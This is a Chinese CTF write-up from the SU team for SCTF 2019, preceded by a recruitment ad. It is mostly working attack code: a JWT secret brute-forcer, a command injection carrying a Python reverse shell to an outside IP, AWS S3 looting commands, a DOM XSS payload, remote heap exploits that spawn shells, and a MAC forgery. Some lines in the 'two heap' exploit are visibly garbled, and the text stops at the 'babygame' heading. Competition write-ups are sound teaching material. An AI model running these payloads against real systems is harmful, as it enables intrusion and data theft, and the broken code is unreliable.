稍微打一波小广告，SU战队长期招人，无论您是小白，大佬，只要乐于分享，愿意交流，我们永远欢迎您的加入。我们可以一起打比赛，一起交流技术，一起为冲击全国甚至国际重要赛事前列而努力。我们的战队成员主要来自五湖四海，还有非常厉害的
**郁离歌** ， **郁离歌** ， **郁离歌**
，（这里的话竟然自己会动！）划重点！！（问：跟郁离歌打比赛是一种什么体验？答：只要花心思想自己怎么躺最舒服就行了！）我们乐于交流，乐于分享，乐于为自己的战队做努力，有着一致的目标。所以，如果有师傅想来一起交流，一起学习进步，一起打比赛的话，加入我们没有
**地区年级** 等任何限制，我们非常欢迎师傅或者团体的加入！欢迎联系：suers_xctf#126.com
以下是我们SU战队本次SCTF 2019的 wp ，再次感谢 Syclover 师傅们的精心准备！
## Web
### flag shop
扫目录发现robots.txt里面有源码路径  
 有源码
漏洞点在 `/work`
    get "/work" do
      islogin
      auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
      auth = auth[0]
      unless params[:SECRET].nil?
        if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
          puts ENV["FLAG"]
        end
      end
      if params[:do] == "#{params[:name][0,7]} is working" then
        auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
        auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
        cookies[:auth] = auth
        ERB::new("").result
      end
    end
应该是个 ruby erb 模版注入，但是在
    ERB::new("").result
这里只能执行7个，一般模版注入的方式是``远超过7个可用的地方。  
猜是不是可以用``构造什么命令来，`SECRETKEY`长度为24位，应该不太可能弄得出来，意味着不能通过正常的`buy flag`来拿到 flag
。  
就剩下去利用这些去读取`ENV`了  
然后发现 ruby 的全局变量, 可以用 $~ 读取刚刚匹配的子串, 加上  刚好 7 字符, 因为 `params[:SECRET]` 可控,
可以来爆破 `ENV["SECRET"]`,
    import requests
    table = '1234567890abcdef'
    url = 'http://47.110.15.101/work'
    data = {
        "name": "",
        "do": " is working"
    }
    sess = requests.session()
    sess.headers['Cookie'] = 'auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIwZmQxMjUzNC1mMmJjLTRhZTUtOTRhNy1kNmUwZWRjMGJkMzEiLCJqa2wiOjEwN30.iI0fcdikWuFxSxYm9LV1dNjCmmID48QZ0c3w-hhyEnw'
    '''
    #后半部分
    key = ''
    for _ in range(1000):
        for i in table:
            tmp = key
            tmp += i
            data['SECRET'] = tmp
            print(tmp)
            res = sess.get(url, data=data)
            print(res.text)
            if tmp in res.text:
                key += i
                print(key)
                break
    '''
    #前半部分
    key = '17b51f7f2588b3d2f09c821e6499984b09810e652ce9fa4882fe4875c8'
    for _ in range(1000):
        for i in table:
            tmp = key
            tmp = i + tmp
            data['SECRET'] = tmp
            res = sess.get(url, data=data)
            if tmp in res.text:
                key = i + key
                print(key)
                break
得到 key 以后直接丢到 jwt.io 里面伪造就完事了.
### easy-web
webpack 打包的时候没关 sourcemap, 可以直接看到源码, 发现后台没鉴权, 直接调接口
    import requests
    data = {
        "key": "abcdefghiklmn123",
        "npm": ["jquery", '''`python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.1.1.1',19132));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"`''']
    }
    res = requests.post('https://sctf2019.l0ca1.xyz/upload', json=data)
弹 shell 回来发现用的 aws 函数服务器. 查了查文档, 在服务器里面可以直接调用 aws api, 找到 bucket 里面的 flag.
    node -e 'const AWS = require("aws-sdk");const s3 = new AWS.S3();s3.listObjects({Bucket: "static.l0ca1.xyz"}).promise().then((r)=>{console.log(r)});'
    node -e 'const AWS = require("aws-sdk");const s3 = new AWS.S3();s3.getObject({Bucket: "static.l0ca1.xyz", Key: "flaaaaaaaaag/flaaaag.txt"}).promise().then((r)=>{console.log(r)});'
### math-is-fun1 && math-is-fun2
`http://题目地址/challenge?name=xxxx%0ADOMPurify[%27isSupported%27]%3d0&text=`
利用config[name]处的变量覆盖关闭dompurify即可利用DOM XSS
## Pwn
### easy heap
    from pwn import *
    context(arch = 'amd64',os='linux')
    def add(size):
        p.recvuntil('>>')
        p.sendline('1')
        p.recvuntil('Size')
        p.sendline(str(size))
        p.recvuntil('0x')
        return p.recv(12)
    def dele(idx):
        p.recvuntil('>>')
        p.sendline('2')
        p.recvuntil('Index')
        p.sendline(str(idx))
    def edit(idx,cont):
        p.recvuntil('>>')
        p.sendline('3')
        p.recvuntil('Index')
        p.sendline(str(idx))
        p.recvuntil('Content')
        p.send(cont)
    libc = ELF('./libc.so.6')
    #p = process('./easy_heap',env={'LD_PRELOAD':'./libc-2.23.so'})
    p = remote('132.232.100.67', 10004)
    p.recvuntil('0x')
    mmap_addr = int(p.recvuntil('\n')[:-1],16)
    print hex(mmap_addr)
    ptr_addr = int(add(0x100-8),16)#0
    info("ptr:0x%x",ptr_addr)
    add(0xf8)#1
    add(0xf8)#2
    edit(0,p64(0)+p64(0xf1)+p64(ptr_addr-0x18)+p64(ptr_addr-0x10)+(0x100-8-16-8-16)*'\x00'+p64(0xf0))
    dele(1)
    #edit(0,p64(0)+p64(0)+p64(0x200)+p64(ptr_addr-8)+p64(0x90)+p64(ptr_addr+0x30-8)+p64(0)+p64(0x91)+'\x00'*0x80+p64(0x90)+p64(0x91)+'\n')
    add(0x80)#1
    add(0x80)#3
    add(0x80)#4
    dele(1)
    dele(4)
    edit(0,p64(0)+p64(0)+p64(0x200)+p64(ptr_addr-8+0x50)+p64(0x200)+p64(mmap_addr)+p64(0)*2+p64(0x80)+'\x28\n')
    edit(3,p64(ptr_addr+0x40)+'\n')
    add(128)
    a = 0x16# int(raw_input("a"),16)
    edit(0,p64(0x200)+'\x20'+chr(a)+'\n')
    edit(5,p64(0xfbad3c80)+p64(0)*3+p8(0)+'\n')
    p.recvuntil(p64(0)*3)
    addr = u64(p.recv(8))
    libc_base = addr - (0x7f7af9dfa6e0-0x7f7af9a37000)
    print hex(libc_base)
    free_hook = libc_base+libc.symbols['__free_hook']
    sh = asm(shellcraft.sh())
    edit(1,sh+'\n')
    edit(0,p64(0x200)+p64(free_hook)+'\n')
    edit(5,p64(mmap_addr)+'\n')
    p.sendline('2')
    p.sendline('0')
    p.interactive()
### one heap
用hbase爆破pbase的1/8192变态house of Roman + 1/1的house of three
    from pwn import *
    context.arch = "amd64"
    context.aslr = False
    libc = ELF("./libc-2.27.so")
    def add(size,data,shift = False):
        io.sendlineafter("choice:",str(1))
        io.sendlineafter("size",str(size))
        if(shift == False):
            io.sendlineafter("content:",data)
        else:
            io.sendafter("content:",data)
    def rm():
        io.sendlineafter("choice:",str(2))
    while(True):
        try:
            #io = process("./one_heap",env = {"LD_PRELOAD":"./libc-2.27.so"})
            io = remote('47.104.89.129',10001)
            add(0x60,'0000')
            rm()
            rm()
            add(0x60,'\x20\x60\x64')
            add(0x60,' ')
            add(0x60,'\n',shift = True)
            add(0x60,p64(0xfbad1880)+p64(0)*3+"\x58")
            lbase = u64(io.recv(6).ljust(8,'\x00'))-libc.sym['_IO_file_jumps']
            success("LBASE -> %#x"%lbase)
            add(0x40,'0000')
            rm()
            rm()
            add(0x40,p64(lbase+libc.sym['__realloc_hook']))
            add(0x40,p64(lbase+libc.sym['__realloc_hook']))
            one = 0x4f2c5
            add(0x40,p64(lbase+one)+p64(lbase+libc.sym['realloc']+0xe))
            add(0x30,"cat flag\x00")
            #gdb.attach(io,'handle SIGALRM nostop noprint')
            io.interactive()
            raw_input()
        except Exception,e:
            info(str(Exception)+str(e))
            io.close()
### two heap
0x1 0x8 0x10 0x18绕size check(都是生成0x20的堆块)
    from pwn import *
    context.arch = 'amd64'
    #context.aslr = False
    libc = ELF("./libc-2.26.so")
    def add(size,data):
        io.sendlineafter("choice:","1")
        io.sendlineafter("size:\n",str(size))
        io.sendafter("note:\n",data)
    def rm(idx):
        io.sendlineafter("choice:","2")
        io.sendlineafter("index:\n",str(idx))
    while(True):
        try:
            io = remote('47.104.89.129',10002)
            #io = process("./two_heap",env = {"LD_PRELOAD":"./libc-2.26.so"})
            io.sendlineafter("SCTF:\n","%a%a%a%a%a")
            io.recvuntil("0x0.0")
            lbase = (int(io.recv(11),16) %#x"%lbase)
            add(1,'')
            rm(0);rm(0);ls
            add(8,p64(lbase+libc.sym['__free_hook']))
            add(0x10,'\n')
            add(24,p64(lbase+libc.sym['system'])+'\n')
            add(40,"/bin/sh\x00"+"\n")
            io.sendline("2")
            io.sendline("4")
            #gdb.attach(io,'handle SIGALRM nostop noprint')
            io.interactive()
            raw_input()
        except Exception,e:
            info(str(e))
            io.close()
## Crypto
### warmup
题目中先 xor 到 16 位然后再用 CBC, 所以只要撞 xor 出来的 16 位就可以了.  
unpad 也没检查, 可以往里面插东西撞 xor.
    import remoteCLI
    from binascii import hexlify, unhexlify
    from Crypto.Util.strxor import strxor
    cli = remoteCLI.CLI()
    cli.connect('47.240.41.112', 12345)
    msg, code = cli.recvUntilFind(r'you seem to have intercepted something:{(.*):(.*)}')
    msg = unhexlify(msg)
    mac = b'\x00' * 16
    for i in range(len(msg) // 16):
        mac = strxor(msg[i * 16:(i + 1) * 16], mac)
    forge_msg = bytearray(b'please send me your flag'+ (b'\x00' * 8))
    forge_msg.extend(forge_msg)
    forge_msg.extend(bytearray(mac))
    length = len(forge_msg) + len(mac) - len('please send me your flag')
    forge_msg[-1] ^= length
    forge_msg.extend(b'\x00' * 15)
    forge_msg.append(length)
    cli.sendLine(hexlify(forge_msg))
    cli.sendLine(code)
    cli.console()
### babygame